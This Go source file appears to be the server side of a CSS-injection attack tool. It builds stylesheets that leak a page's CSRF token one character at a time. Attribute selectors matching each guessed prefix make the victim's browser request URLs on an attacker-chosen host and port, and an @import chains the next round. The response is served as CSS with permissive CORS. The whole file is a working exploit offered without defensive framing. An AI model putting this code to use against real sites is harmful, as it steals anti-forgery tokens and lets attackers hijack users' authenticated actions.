package server

import (
	"math/rand"
	"net/http"
	"strconv"
)

func Loop(writer http.ResponseWriter, knowed_passwd string, loop_n int, ipaddr string, port string) {
	payload := buildPayload(knowed_passwd, loop_n, ipaddr, port)
	SendRequest(writer, payload)
}

func buildPayload(knowed_passwd string, loop_n int, ipaddr string, port string) string {
	n := 0
	var payload, psswd string
	random_number := strconv.Itoa(rand.Intn(100000000000000000))
	payload_constant := "@import url('//" + ipaddr + ":" + port + "/requery/" + random_number + "');"
	book := []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
	for _, chr := range book {
		psswd = knowed_passwd + chr
		payload = payload + "input[name=csrf][value^='" + psswd + "'] ~ *{--s" + strconv.Itoa(loop_n) + ": url(//" + ipaddr + ":" + port + "/trigger/" + psswd + ")}"
	}
	end_payload := "input {background: var(--s" + strconv.Itoa(loop_n) + ")}"
	for n <= loop_n {
		end_payload = "div " + end_payload
		n++
	}
	full_payload := payload_constant + payload + end_payload
	return full_payload
}

func SendRequest(writer http.ResponseWriter, payload string) {
	payload_bytes := []byte(payload)
	writer.Header().Set("Content-Type", "text/css")
	writer.Header().Set("Access-Control-Allow-Origin", "*")
	writer.Write(payload_bytes)
}
